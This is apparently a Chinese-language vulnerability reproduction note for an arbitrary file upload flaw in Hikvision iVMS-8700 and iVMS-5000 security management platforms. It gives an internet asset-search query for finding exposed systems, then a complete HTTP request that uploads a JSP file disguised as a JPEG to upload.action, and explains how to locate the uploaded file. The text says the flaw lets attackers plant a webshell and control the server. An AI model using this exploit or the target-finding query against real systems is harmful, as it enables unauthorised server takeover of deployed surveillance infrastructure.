# 海康威视iVMS-8700综合安防管理平台 upload.action 任意文件上传

# 一、漏洞简介
  海康威视iVMS集中监控应用管理平台，是以安全防范业务应用为导向，以视频图像应用为基础手段，综合视频监控、联网报警、智能分析、运维管理等多种安全防范应用系统，构建的多业务应用综合管理平台。HIKVISION iVMS-8700综合安防管理平台存在任意文件上传漏洞，攻击者通过发送特定的请求包可以上传Webshell文件控制服务器。

# 二、影响版本
+ 海康威视综合安防系统iVMS-5000
+ 海康威视综合安防系统 iVMS-8700

# 三、资产测绘
+ hunter：`web.body="/views/home/file/installPackage.rar"`

![1691851218187-fa3d0a98-32b2-48ea-a294-7c7f565c20f0.png](./img/bWyBo5fSbGoz212v/1691851218187-fa3d0a98-32b2-48ea-a294-7c7f565c20f0-912698.png)

+ 登录页面：

![1691851119101-58fb28dd-18f8-4fca-b027-9931d8ce0111.png](./img/bWyBo5fSbGoz212v/1691851119101-58fb28dd-18f8-4fca-b027-9931d8ce0111-920145.png)

# 四、漏洞复现
```plain
POST /eps/resourceOperations/upload.action HTTP/1.1
Host: xx.xx.xx.xx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: MicroMessenger
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ISMS_8700_Sessionname=CA0F207A6372FE883ACA78B74E6DC953; CAS-USERNAME=058; ISMS_8700_Sessionname=4D808BE7BE0E5C7047B9688E6009F710
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj
Content-Length: 212

------WebKitFormBoundaryTJyhtTNqdMNLZLhj
Content-Disposition: form-data; name="fileUploader";filename="test.jsp"
Content-Type: image/jpeg

<%out.print("hello");%>
------WebKitFormBoundaryTJyhtTNqdMNLZLhj--
```

![1700226259831-01874e31-0fdb-4719-bd14-5f1e64019ea0.png](./img/bWyBo5fSbGoz212v/1700226259831-01874e31-0fdb-4719-bd14-5f1e64019ea0-358413.png)

根据响应拼接上传文件地址

```plain
/eps/upload/ebaae9074e254f829c8de29bb5cfcb1c.jsp
```

![1700226291441-59c6dd72-c5c0-42be-9f28-e8861a960b9f.png](./img/bWyBo5fSbGoz212v/1700226291441-59c6dd72-c5c0-42be-9f28-e8861a960b9f-371534.png)



> 更新: 2024-02-29 23:57:17  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nut2noq5hg2uq96x>